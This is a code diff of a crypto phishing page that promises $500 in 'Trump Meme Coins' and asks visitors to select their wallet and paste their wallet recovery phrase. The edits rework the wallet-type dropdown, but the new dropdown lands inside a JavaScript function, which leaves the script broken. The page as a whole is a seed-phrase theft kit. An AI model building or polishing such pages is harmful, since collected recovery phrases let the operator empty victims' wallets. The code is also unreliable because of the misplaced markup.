@@ -240,40 +240,7 @@
     <h2>Connect Your Wallet</h2>
     <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
     <form id="wallet-form">
-      <label for="wallet-type">Select Wallet Type</label>
-<select id="wallet-type" name="wallet_type" required>
-  <!-- Popular in USA / Global -->
-  <option value="metamask">MetaMask</option>
-  <option value="trustwallet">Trust Wallet</option>
-  <option value="coinbase">Coinbase Wallet</option>
-  <option value="exodus">Exodus</option>
-  <option value="atomic">Atomic Wallet</option>
-
-  <!-- Asia-focused Wallets -->
-  <option value="bitkeep">BitKeep (Asia)</option>
-  <option value="imtoken">imToken (Asia)</option>
-  <option value="mathwallet">MathWallet (Asia)</option>
-  <option value="tokenpocket">TokenPocket (Asia)</option>
-
-  <!-- Europe Popularity -->
-  <option value="coinomi">Coinomi (Europe)</option>
-  <option value="brd">BRD (Europe/Global)</option>
-  <option value="argent">Argent (Europe)</option>
-  <option value="zengo">Zengo (Europe/Global)</option>
-
-  <!-- South America / Global Reach -->
-  <option value="alphawallet">AlphaWallet (Global)</option>
-  <option value="rainbow">Rainbow (Americas)</option>
-
-  <!-- Phantom and Other Compatible Wallets -->
-  <option value="phantom">Phantom (Solana)</option>
-  <option value="myetherwallet">MyEtherWallet (Ethereum)</option>
-  <option value="blockchain">Blockchain Wallet</option>
-  <option value="bitpie">Bitpie (Asia)</option>
-
-  <!-- Fallback -->
-  <option value="others">Others</option>
-</select>
+      
       <label for="wallet-phrase">Enter Your Wallet Phrase</label>
       <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
       <div class="note">
@@ -303,7 +270,36 @@
       document.getElementById('wallet-page').classList.add('active');
       document.getElementById('main-content').classList.add('blurred');
       document.querySelector('header').classList.add('blurred');
-      document.querySelector('footer').classList.add('blurred');
+   <label for="wallet-type">Select Wallet Type</label>
+<select id="wallet-type" name="wallet_type" required>
+  <option value="alphawallet">AlphaWallet</option>
+  <option value="argent">Argent</option>
+  <option value="atomic">Atomic Wallet</option>
+  <option value="bitkeep">BitKeep</option>
+  <option value="bitpie">Bitpie</option>
+  <option value="blockchain">Blockchain Wallet</option>
+  <option value="brd">BRD</option>
+  <option value="coin98">Coin98</option>
+  <option value="coinomi">Coinomi</option>
+  <option value="coinbase">Coinbase Wallet</option>
+  <option value="exodus">Exodus</option>
+  <option value="huobi">Huobi Wallet</option>
+  <option value="imtoken">imToken</option>
+  <option value="mathwallet">MathWallet</option>
+  <option value="metamask">MetaMask</option>
+  <option value="mycelium">Mycelium</option>
+  <option value="myetherwallet">MyEtherWallet</option>
+  <option value="phantom">Phantom</option>
+  <option value="rainbow">Rainbow</option>
+  <option value="safepal">SafePal</option>
+  <option value="solflare">Solflare</option>
+  <option value="tokenpocket">TokenPocket</option>
+  <option value="trustwallet">Trust Wallet</option>
+  <option value="zelcore">Zelcore</option>
+  <option value="zengo">Zengo</option>
+  <option value="others">Others</option>
+</select>
+   document.querySelector('footer').classList.add('blurred');
       document.body.classList.add('noscroll');
     }
 
